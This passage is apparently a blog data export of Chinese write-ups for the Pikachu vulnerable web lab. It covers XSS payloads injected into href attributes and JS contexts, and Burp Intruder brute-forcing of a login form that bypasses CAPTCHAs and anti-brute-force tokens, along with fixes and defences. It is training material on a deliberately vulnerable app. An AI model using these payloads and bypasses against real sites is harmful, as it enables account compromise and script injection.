alt></p>\n<p>但是存在一个问题，<code>htmlspecialchars()</code>函数默认是不对单引号进行转义的，要想连单引号一起转义，需要给函数传入参数<code>ENT_QUOTES</code>。</p>\n<p><code>htmlspecialchars()</code>函数把预定义的字符转换为 HTML实体。</p>\n<blockquote>\n<p>预定义的字符是：</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;   &amp;  转为 `&amp;amp;` </span><br><span class=\"line\">&gt;   &quot;  转为 `&amp;quot;`</span><br><span class=\"line\">&gt;   &apos;  转为 `&amp;#039;` </span><br><span class=\"line\">&gt;   &lt;  转为 `&amp;lt;` </span><br><span class=\"line\">&gt;   &gt;  转为 `&amp;gt;`</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>可用的引号类型： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; ENT_COMPAT - 默认。仅编码双引号。 </span><br><span class=\"line\">&gt; ENT_QUOTES - 编码双引号和单引号。 </span><br><span class=\"line\">&gt; ENT_NOQUOTES - 不编码任何引号。</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>漏洞修复</strong></p>\n<p>使用<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>,而不是<code>htmlspecialchars($GET[&#39;message&#39;])</code>。</p>\n<h4 id=\"0x08-XSS-href输出\"><a href=\"#0x08-XSS-href输出\" class=\"headerlink\" title=\"0x08 XSS href输出\"></a>0x08 XSS href输出</h4><p><strong>漏洞挖掘</strong></p>\n<p>打开页面继续使用XSS探针进行测试，可以发现特殊字符都被转义了，包括单引号。猜测使用了<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>对提交的数据进行转义。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322102841.png\" alt></p>\n<p>但是，可以发现，我们输入的内容会被输出到<code>&lt;a&gt;</code>标签的<code>href</code>属性中。因此我们可以使用伪协议<code>javascript</code>进行绕过。</p>\n<p>输入Payload：<code>javascript:alert(1)</code>,点击超链接，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p>后台确实对提交的数据进行了转义，但却没考虑到<code>href</code>属性可以使用伪协议执行JS。</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322103254.png\" alt></p>\n<p><strong>漏洞修复</strong></p>\n<p>对输入的数据进行过滤，只允许http/https。</p>\n<p>对输出的数据进行转义，使用<code>htmlspecialchars($GET[&#39;message&#39;],ENT_QUOTES)</code>。</p>\n<h4 id=\"0x09-XSS之输出到JS\"><a href=\"#0x09-XSS之输出到JS\" class=\"headerlink\" title=\"0x09 XSS之输出到JS\"></a>0x09 XSS之输出到JS</h4><p><strong>漏洞挖掘</strong></p>\n<p>在页面输入内容，我们可以发现输入的数据会被输出在页面的JS代码之中，例如我们输入<code>whatever</code>：</p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104225.png\" alt></p>\n<p>那么，我们只需要考虑闭合，即可构造XSS，输入Payload：<code>&#39;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，成功弹窗。</p>\n<p><strong>漏洞分析</strong></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104702.png\" alt></p>\n<p><img src=\"/2019/03/21/WEB漏洞靶场pikachu-xss/QQ截图20190322104739.png\" alt></p>\n<p><strong>漏洞修复</strong></p>\n<p>这里有一个问题，由于输出点是<code>&lt;script&gt;</code>标签中，而在该标签中的内容HTML解析器是不会进行解码的，因此不能使用<code>htmlspecialchars()</code>函数进行转义，否则JS代码将会因为无法被解码而无法正常执行。具体原理参考文章：<a href=\"https://sakuxa.com/2019/03/07/0x00-XSS%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E4%B9%8B%E8%A7%A3%E6%9E%90HTML%E6%96%87%E6%A1%A3/\">XSS学习系列Chapter 1：浏览器解析HTML文档</a></p>\n<p>所以解决方案应该是：在JS的输出点应该使用\\对特殊字符进行转义。</p>\n<h3 id=\"三、总结\"><a href=\"#三、总结\" class=\"headerlink\" title=\"三、总结\"></a>三、总结</h3><ul>\n<li>XSS漏洞会出现的点是复杂的、多种多样的。</li>\n<li>XSS漏洞的本质是用户提交的数据被当作JS代码执行，因此挖掘XSS漏洞就是要想方设法让输入的数据被执行。</li>\n<li>XSS漏洞的防范总体可以概括为“对输入进行过滤”和“对输出进行转义”，但是针对不同地方、不同功能点的防范方式及要考虑的方面也是不尽相同的。如0x08与0x09小节就是很好的例子。</li>\n</ul>"},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 1：表单暴力破解","date":"2019-03-19T01:03:38.000Z","_content":"\n## 一、前面的话\n\n### 0x00 Whatever\n\n无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。\n\n看到靶场介绍里有一句话：\n\n> “如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。\n\n觉得很是这么个道理，因此在使用该靶场时，会包含如下方面：\n\n> - 漏洞挖掘：找出漏洞或证明漏洞。\n> - 漏洞分析：分析源代码。\n> - 漏洞利用。\n> - 漏洞修复。\n\n<!-- more -->\n\n### 0x01 靶机介绍\n\nPikachu源码：https://github.com/zhuifengshaonianhanlu/pikachu\n\nPikachu是一个带有漏洞的Web应用系统，包含了常见的web安全漏洞。\n\n包含：\n\n> - Burt Force(暴力破解漏洞)\n> - XSS(跨站脚本漏洞)\n> - CSRF(跨站请求伪造)\n> - SQL-Inject(SQL注入漏洞)\n> - RCE(远程命令/代码执行)\n> - Files Inclusion(文件包含漏洞)\n> - Unsafe file downloads(不安全的文件下载)\n> - Unsafe file uploads(不安全的文件上传)\n> - Over Permisson(越权漏洞)\n> - ../../../(目录遍历)\n> - I can see your ABC(敏感信息泄露)\n> - PHP反序列化漏洞\n> - XXE(XML External Entity attack)\n> - 不安全的URL重定向\n> - SSRF(Server-Side Request Forgery)\n> - 管理工具\n> - More...(找找看?..有彩蛋!)\n\n## 二、暴力破解\n\n### 0x00 简单表单爆破\n\n**漏洞挖掘**\n\n打开页面，是一个登录表单页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319090517.png)\n\n输入admin/admin作为用户名/密码，点击Login，并使用burp进行抓包拦截。\n\n在burp右键抓到的数据包，然后`Send to Intruder`。或者直接`Ctrl + I`发送到intuder爆破模块。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319090805.png)\n\n转到`intruder`模块，在`Positions`按钮下，先点击右侧的`Clear $ `清除变量，然后选中用户名和密码位置点击`ADD $`将用户名和密码位置作为变量。`Attack type`就使用`Cluster bomb`模式。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093205.png)\n\n点击`Positions`按钮旁边的`Payloads`按钮进入设置Payload，由于我们设置了两个变量，所以需要设置两个Payload。\n\n选择`Payload set`为1，`Payload Type`使用默认的`Simple list`，然后点击`Load`导入用户名字典文件。\n\n选择`Payload set`为2，`Payload Type`使用默认的`Simple list`，然后点击`Load`导入密码字典文件。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093646.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093717.png)\n\n设置好之后，点击右上角`Start Attack`。\n\n在爆破时，点击`Length`字段进行排序，可发现有不同大小的数据包，点击查看数据包发现爆破成功。密码：admin/123456\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093939.png)\n\n### 0x01 服务器端验证码绕过\n\n**漏洞挖掘**\n\n打开页面，还是一个登录表单页面，但是增加了验证码。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319094111.png)\n\n接下来尝试绕过验证码。\n\n首先先确定，验证码是服务器生成的，还是客户端JS生成的。\n\n在网页上按下`F12`按钮，定位验证码图片，图片由`<img>`标签加载，可以确定验证码由服务器生成。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319104247.png)\n\n确定了验证码是由服务器生成了之后，再确定服务器是否真的对验证码做了验证。\n\n输入用户名密码及验证码然后点击Login，并使用Burp进行抓包。\n\n右击抓到的数据包，选择`Send to Repeater`发送到重放模块。或者直接`Ctrl + R`。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319094958.png)\n\n点击进入`Repeater`模块，将验证码修改为任意值后，点击`Go`按钮进行重放。发现返回验证码输入错误，证明服务器对验证码做了验证。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319095233.png)\n\n接下来，将验证码设置为正确的值，然后发送数据包，发现验证码验证成功。然后再继续重放该正确验证码的数据包几次，发现即使由于用户名密码不正确，导致页面刷新了验证码，但是并不需要再次输入验证码。即服务器只验证了一次验证码，验证成功的验证码可以一直重复使用。\n\n我们只需要验证正确一次验证码，就可以一直使用该验证码，然后就可以进行爆破了。爆破的流程同上一节，不再赘述。\n\n**漏洞分析：**\n\n接下来，让我们来分析一下源码，看漏洞是如何产生的（只截取部分关键代码）：\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319101955.png)\n\n通过源码分析，我们可以得知，我们提交的验证码会被与存储在服务器session中的验证码做验证，但是由于在验证完成后，没有及时的销毁session，导致存储在session中的验证码在session生存周期内可以一直被重复使用。\n\n**漏洞修复**：\n\n在验证完成之后，销毁验证码session：`unset($_SESSION['vcode']);`\n\n另，\n\n通过分析验证码生成的源码，还发现了一个问题，生成的验证码会被以明文方式作为Cookie返回给客户端。这会导致直接可以进行爆破，爆破方法参照下面0x03节的内容。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103538.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103611.png)\n\n### 0x02 客户端验证码绕过\n\n**漏洞挖掘**\n\n打开页面，是一个包含验证码的表单登录页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103858.png)\n\n还是先确定验证码是由JS生成还是由服务器生成。\n\n继续在页面`F12`,然后定位找到元素，可以确定是由客户端JS的`createCode()`函数生成。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319104637.png)\n\n输入用户名密码及验证码，点击Login并使用Burp抓包。将验证码删除并进行重放，发现没有影响。可以确定服务器并未对验证码进行验证。接下来直接进行爆破即可，爆破流程参考前面。\n\n**漏洞分析**\n\n前端JS生成验证码且前端JS进行验证码的校验，对使用Burp抓包爆破而言形同虚设。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319110240.png)\n\n### 0x03 Token防爆破\n\n首先，先给出结论，表单token的作用是防止重复提交和CSRF。但不要认为有防止重复提交在防爆破上就有作用。\n\n因为表单Token是作为一个隐藏的`<input />`标签的值输出在返回给用户的页面的，是可以直接从页面读取获取的，所以是防不了爆破的。如果还有疑问，继续往下看使用Burp进行爆破。\n\n还是继续登录并抓包的操作，可以发现POST提交的数据中存在Token，第一次放行数据包，返回用户名密码不存在。接着再连续重放该数据包，发现只是刷新的页面，返回消息没有再报用户名密码不存在。因此可以猜测到，服务器对Token做了验证，由于Token不正确所以没有进行用户名密码验证的逻辑，所以仅刷新了页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319114454.png)\n\n接下来使用Burp进行爆破，先将数据包发送到Intruder模块。\n\n将用户名、密码、Token作为变量，`Attack Type`使用`Pitch fork`模式。（注意，只能使用该模式）\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319115718.png)\n\n转到`Options`按钮下，找到`Grep-Extract`，勾选`Extract the following items from response`，然后点击`ADD`。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319125134.png)\n\n点击`ADD`后会弹出一个框，按下图步骤方式配置，配置完成点击`OK`。作用就是可以从响应消息（Response）中提取一段数据作为下一次请求信息（Request）的Payload。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319125941.png)\n\n接着转到`Payloads`按钮下设置Payload\n\n选择`Payload set`为1，`Payload Type`使用默认的`Simple list`，然后点击Load导入用户名字典文件。\n\n选择`Payload set`为2，`Payload Type`使用默认的`Simple list`，然后点击Load导入密码字典文件。\n\n选择`Payload set`为3，`Payload Type`选择`Recursive grep`，然后输入第一个请求要使用的Payload(可以不设)。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319130503.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319130947.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319131320.png)\n\n设置完成后，点击`Start attack`，发现报错。这是因为不能使用多线程爆破，因为每次爆破其中一个Payload需要从前一个响应消息中提取。因此再次转到`Options`按钮下，找到`Request Engine`，修改线程数为单线程。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319131802.png)\n\n再次点击`Start attack`，进行爆破即可。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319132139.png)\n\n点击`Length`按钮进行排序，发现一个长度与其他不一致的数据包，点击数据包查看，爆破成功。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319132951.png)\n\n**漏洞分析**\n\n查看源码发现服务器端在进行用户名密码验证的逻辑之前，先验证了token。印证了我们之前的猜想。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319133447.png)\n\n但是使用Token进行防爆破的漏洞不在于是否对Token进行了验证，而在于Token会返回在页面中被读取。\n\n## 三、总结\n\n> 防暴力破解应该理解成防止自动化脚本快速请求以达到破解的目的。\n\n**表单暴力破解防范**：\n\n>1. 使用安全的验证码进行验证（滑动验证码...）。\n>2. 在某段单位时间内，用户登录失败达到一定次数时，锁定用户或限制短时间内不允许登录。\n>3. 对IP进行单位时间内登录请求数的限制。\n>4. 验证码应该以图片形式而不是以字符串形式出现在HTML或Cookie中。\n\n**参考链接：**\n\nhttps://www.cnblogs.com/KbCat/p/9317545.html","source":"_posts/WEB漏洞靶场pikachu—writeup.md","raw":"---\ntitle: WEB漏洞靶场Pikachu Writeup Chapter 1：表单暴力破解\ndate: 2019-03-19 09:03:38\ntags: \n\t- 靶场\n\t- WEB安全\n\t- 暴力破解\ncategories:\n\t- Pikachu\n---\n\n## 一、前面的话\n\n### 0x00 Whatever\n\n无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。\n\n看到靶场介绍里有一句话：\n\n> “如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。\n\n觉得很是这么个道理，因此在使用该靶场时，会包含如下方面：\n\n> - 漏洞挖掘：找出漏洞或证明漏洞。\n> - 漏洞分析：分析源代码。\n> - 漏洞利用。\n> - 漏洞修复。\n\n<!-- more -->\n\n### 0x01 靶机介绍\n\nPikachu源码：https://github.com/zhuifengshaonianhanlu/pikachu\n\nPikachu是一个带有漏洞的Web应用系统，包含了常见的web安全漏洞。\n\n包含：\n\n> - Burt Force(暴力破解漏洞)\n> - XSS(跨站脚本漏洞)\n> - CSRF(跨站请求伪造)\n> - SQL-Inject(SQL注入漏洞)\n> - RCE(远程命令/代码执行)\n> - Files Inclusion(文件包含漏洞)\n> - Unsafe file downloads(不安全的文件下载)\n> - Unsafe file uploads(不安全的文件上传)\n> - Over Permisson(越权漏洞)\n> - ../../../(目录遍历)\n> - I can see your ABC(敏感信息泄露)\n> - PHP反序列化漏洞\n> - XXE(XML External Entity attack)\n> - 不安全的URL重定向\n> - SSRF(Server-Side Request Forgery)\n> - 管理工具\n> - More...(找找看?..有彩蛋!)\n\n## 二、暴力破解\n\n### 0x00 简单表单爆破\n\n**漏洞挖掘**\n\n打开页面，是一个登录表单页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319090517.png)\n\n输入admin/admin作为用户名/密码，点击Login，并使用burp进行抓包拦截。\n\n在burp右键抓到的数据包，然后`Send to Intruder`。或者直接`Ctrl + I`发送到intuder爆破模块。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319090805.png)\n\n转到`intruder`模块，在`Positions`按钮下，先点击右侧的`Clear $ `清除变量，然后选中用户名和密码位置点击`ADD $`将用户名和密码位置作为变量。`Attack type`就使用`Cluster bomb`模式。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093205.png)\n\n点击`Positions`按钮旁边的`Payloads`按钮进入设置Payload，由于我们设置了两个变量，所以需要设置两个Payload。\n\n选择`Payload set`为1，`Payload Type`使用默认的`Simple list`，然后点击`Load`导入用户名字典文件。\n\n选择`Payload set`为2，`Payload Type`使用默认的`Simple list`，然后点击`Load`导入密码字典文件。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093646.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093717.png)\n\n设置好之后，点击右上角`Start Attack`。\n\n在爆破时，点击`Length`字段进行排序，可发现有不同大小的数据包，点击查看数据包发现爆破成功。密码：admin/123456\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319093939.png)\n\n### 0x01 服务器端验证码绕过\n\n**漏洞挖掘**\n\n打开页面，还是一个登录表单页面，但是增加了验证码。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319094111.png)\n\n接下来尝试绕过验证码。\n\n首先先确定，验证码是服务器生成的，还是客户端JS生成的。\n\n在网页上按下`F12`按钮，定位验证码图片，图片由`<img>`标签加载，可以确定验证码由服务器生成。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319104247.png)\n\n确定了验证码是由服务器生成了之后，再确定服务器是否真的对验证码做了验证。\n\n输入用户名密码及验证码然后点击Login，并使用Burp进行抓包。\n\n右击抓到的数据包，选择`Send to Repeater`发送到重放模块。或者直接`Ctrl + R`。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319094958.png)\n\n点击进入`Repeater`模块，将验证码修改为任意值后，点击`Go`按钮进行重放。发现返回验证码输入错误，证明服务器对验证码做了验证。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319095233.png)\n\n接下来，将验证码设置为正确的值，然后发送数据包，发现验证码验证成功。然后再继续重放该正确验证码的数据包几次，发现即使由于用户名密码不正确，导致页面刷新了验证码，但是并不需要再次输入验证码。即服务器只验证了一次验证码，验证成功的验证码可以一直重复使用。\n\n我们只需要验证正确一次验证码，就可以一直使用该验证码，然后就可以进行爆破了。爆破的流程同上一节，不再赘述。\n\n**漏洞分析：**\n\n接下来，让我们来分析一下源码，看漏洞是如何产生的（只截取部分关键代码）：\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319101955.png)\n\n通过源码分析，我们可以得知，我们提交的验证码会被与存储在服务器session中的验证码做验证，但是由于在验证完成后，没有及时的销毁session，导致存储在session中的验证码在session生存周期内可以一直被重复使用。\n\n**漏洞修复**：\n\n在验证完成之后，销毁验证码session：`unset($_SESSION['vcode']);`\n\n另，\n\n通过分析验证码生成的源码，还发现了一个问题，生成的验证码会被以明文方式作为Cookie返回给客户端。这会导致直接可以进行爆破，爆破方法参照下面0x03节的内容。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103538.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103611.png)\n\n### 0x02 客户端验证码绕过\n\n**漏洞挖掘**\n\n打开页面，是一个包含验证码的表单登录页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319103858.png)\n\n还是先确定验证码是由JS生成还是由服务器生成。\n\n继续在页面`F12`,然后定位找到元素，可以确定是由客户端JS的`createCode()`函数生成。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319104637.png)\n\n输入用户名密码及验证码，点击Login并使用Burp抓包。将验证码删除并进行重放，发现没有影响。可以确定服务器并未对验证码进行验证。接下来直接进行爆破即可，爆破流程参考前面。\n\n**漏洞分析**\n\n前端JS生成验证码且前端JS进行验证码的校验，对使用Burp抓包爆破而言形同虚设。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319110240.png)\n\n### 0x03 Token防爆破\n\n首先，先给出结论，表单token的作用是防止重复提交和CSRF。但不要认为有防止重复提交在防爆破上就有作用。\n\n因为表单Token是作为一个隐藏的`<input />`标签的值输出在返回给用户的页面的，是可以直接从页面读取获取的，所以是防不了爆破的。如果还有疑问，继续往下看使用Burp进行爆破。\n\n还是继续登录并抓包的操作，可以发现POST提交的数据中存在Token，第一次放行数据包，返回用户名密码不存在。接着再连续重放该数据包，发现只是刷新的页面，返回消息没有再报用户名密码不存在。因此可以猜测到，服务器对Token做了验证，由于Token不正确所以没有进行用户名密码验证的逻辑，所以仅刷新了页面。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319114454.png)\n\n接下来使用Burp进行爆破，先将数据包发送到Intruder模块。\n\n将用户名、密码、Token作为变量，`Attack Type`使用`Pitch fork`模式。（注意，只能使用该模式）\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319115718.png)\n\n转到`Options`按钮下，找到`Grep-Extract`，勾选`Extract the following items from response`，然后点击`ADD`。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319125134.png)\n\n点击`ADD`后会弹出一个框，按下图步骤方式配置，配置完成点击`OK`。作用就是可以从响应消息（Response）中提取一段数据作为下一次请求信息（Request）的Payload。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319125941.png)\n\n接着转到`Payloads`按钮下设置Payload\n\n选择`Payload set`为1，`Payload Type`使用默认的`Simple list`，然后点击Load导入用户名字典文件。\n\n选择`Payload set`为2，`Payload Type`使用默认的`Simple list`，然后点击Load导入密码字典文件。\n\n选择`Payload set`为3，`Payload Type`选择`Recursive grep`，然后输入第一个请求要使用的Payload(可以不设)。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319130503.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319130947.png)\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319131320.png)\n\n设置完成后，点击`Start attack`，发现报错。这是因为不能使用多线程爆破，因为每次爆破其中一个Payload需要从前一个响应消息中提取。因此再次转到`Options`按钮下，找到`Request Engine`，修改线程数为单线程。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319131802.png)\n\n再次点击`Start attack`，进行爆破即可。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319132139.png)\n\n点击`Length`按钮进行排序，发现一个长度与其他不一致的数据包，点击数据包查看，爆破成功。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319132951.png)\n\n**漏洞分析**\n\n查看源码发现服务器端在进行用户名密码验证的逻辑之前，先验证了token。印证了我们之前的猜想。\n\n![](WEB漏洞靶场pikachu—writeup\\QQ截图20190319133447.png)\n\n但是使用Token进行防爆破的漏洞不在于是否对Token进行了验证，而在于Token会返回在页面中被读取。\n\n## 三、总结\n\n> 防暴力破解应该理解成防止自动化脚本快速请求以达到破解的目的。\n\n**表单暴力破解防范**：\n\n>1. 使用安全的验证码进行验证（滑动验证码...）。\n>2. 在某段单位时间内，用户登录失败达到一定次数时，锁定用户或限制短时间内不允许登录。\n>3. 对IP进行单位时间内登录请求数的限制。\n>4. 验证码应该以图片形式而不是以字符串形式出现在HTML或Cookie中。\n\n**参考链接：**\n\nhttps://www.cnblogs.com/KbCat/p/9317545.html","slug":"WEB漏洞靶场pikachu—writeup","published":1,"updated":"2019-03-21T03:13:20.421Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83nb00697or0kxlqcmut","content":"<h2 id=\"一、前面的话\"><a href=\"#一、前面的话\" class=\"headerlink\" title=\"一、前面的话\"></a>一、前面的话</h2><h3 id=\"0x00-Whatever\"><a href=\"#0x00-Whatever\" class=\"headerlink\" title=\"0x00 Whatever\"></a>0x00 Whatever</h3><p>无意间发现了pikachu这个WEB漏洞靶场，发现靶场涉及到的漏洞类型蛮多的，练练手挺合适的。</p>\n<p>看到靶场介绍里有一句话：</p>\n<blockquote>\n<p>“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。</p>\n</blockquote>\n<p>觉得很是这么个道理，因此在使用该靶场时，会包含如下方面：</p>\n<blockquote>\n<ul>\n<li>漏洞挖掘：找出漏洞或证明漏洞。</li>\n<li>漏洞分析：分析源代码。</li>\n<li>漏洞利用。</li>\n<li>漏洞修复。</li>\n</ul>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"0x01-靶机介绍\"><a href=\"#0x01-靶机介绍\" class=\"headerlink\" title=\"0x01 靶机介绍\"></a>0x01 靶机介绍</h3><p>Pikachu源码：<a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\" target=\"_blank\" rel=\"noopener\">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>\n<p>Pikachu是一个带有漏洞的Web应用系统，包含了常见的web安全漏洞。</p>\n<p>包含：</p>\n<blockquote>\n<ul>\n<li>Burt Force(暴力破解漏洞)</li>\n<li>XSS(跨站脚本漏洞)</li>\n<li>CSRF(跨站请求伪造)</li>\n<li>SQL-Inject(SQL注入漏洞)</li>\n<li>RCE(远程命令/代码执行)</li>\n<li>Files Inclusion(文件包含漏洞)</li>\n<li>Unsafe file downloads(不安全的文件下载)</li>\n<li>Unsafe file uploads(不安全的文件上传)</li>\n<li>Over Permisson(越权漏洞)</li>\n<li>../../../(目录遍历)</li>\n<li>I can see your ABC(敏感信息泄露)</li>\n<li>PHP反序列化漏洞</li>\n<li>XXE(XML External Entity attack)</li>\n<li>不安全的URL重定向</li>\n<li>SSRF(Server-Side Request Forgery)</li>\n<li>管理工具</li>\n<li>More…(找找看?..有彩蛋!)</li>\n</ul>\n</blockquote>\n<h2 id=\"二、暴力破解\"><a href=\"#二、暴力破解\" class=\"headerlink\" title=\"二、暴力破解\"></a>二、暴力破解</h2><h3 id=\"0x00-简单表单爆破\"><a href=\"#0x00-简单表单爆破\" class=\"headerlink\" title=\"0x00 简单表单爆破\"></a>0x00 简单表单爆破</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，是一个登录表单页面。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319090517.png\" alt></p>\n<p>输入admin/admin作为用户名/密码，点击Login，并使用burp进行抓包拦截。</p>\n<p>在burp右键抓到的数据包，然后<code>Send to Intruder</code>。或者直接<code>Ctrl + I</code>发送到intuder爆破模块。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319090805.png\" alt></p>\n<p>转到<code>intruder</code>模块，在<code>Positions</code>按钮下，先点击右侧的<code>Clear $</code>清除变量，然后选中用户名和密码位置点击<code>ADD $</code>将用户名和密码位置作为变量。<code>Attack type</code>就使用<code>Cluster bomb</code>模式。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093205.png\" alt></p>\n<p>点击<code>Positions</code>按钮旁边的<code>Payloads</code>按钮进入设置Payload，由于我们设置了两个变量，所以需要设置两个Payload。</p>\n<p>选择<code>Payload set</code>为1，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击<code>Load</code>导入用户名字典文件。</p>\n<p>选择<code>Payload set</code>为2，<code>Payload Type</code>使用默认的<code>Simple list</code>，然后点击<code>Load</code>导入密码字典文件。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093646.png\" alt></p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093717.png\" alt></p>\n<p>设置好之后，点击右上角<code>Start Attack</code>。</p>\n<p>在爆破时，点击<code>Length</code>字段进行排序，可发现有不同大小的数据包，点击查看数据包发现爆破成功。密码：admin/123456</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319093939.png\" alt></p>\n<h3 id=\"0x01-服务器端验证码绕过\"><a href=\"#0x01-服务器端验证码绕过\" class=\"headerlink\" title=\"0x01 服务器端验证码绕过\"></a>0x01 服务器端验证码绕过</h3><p><strong>漏洞挖掘</strong></p>\n<p>打开页面，还是一个登录表单页面，但是增加了验证码。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319094111.png\" alt></p>\n<p>接下来尝试绕过验证码。</p>\n<p>首先先确定，验证码是服务器生成的，还是客户端JS生成的。</p>\n<p>在网页上按下<code>F12</code>按钮，定位验证码图片，图片由<code>&lt;img&gt;</code>标签加载，可以确定验证码由服务器生成。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319104247.png\" alt></p>\n<p>确定了验证码是由服务器生成了之后，再确定服务器是否真的对验证码做了验证。</p>\n<p>输入用户名密码及验证码然后点击Login，并使用Burp进行抓包。</p>\n<p>右击抓到的数据包，选择<code>Send to Repeater</code>发送到重放模块。或者直接<code>Ctrl + R</code>。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319094958.png\" alt></p>\n<p>点击进入<code>Repeater</code>模块，将验证码修改为任意值后，点击<code>Go</code>按钮进行重放。发现返回验证码输入错误，证明服务器对验证码做了验证。</p>\n<p><img src=\"/2019/03/19/WEB漏洞靶场pikachu—writeup/QQ截图20190319095233.png\" 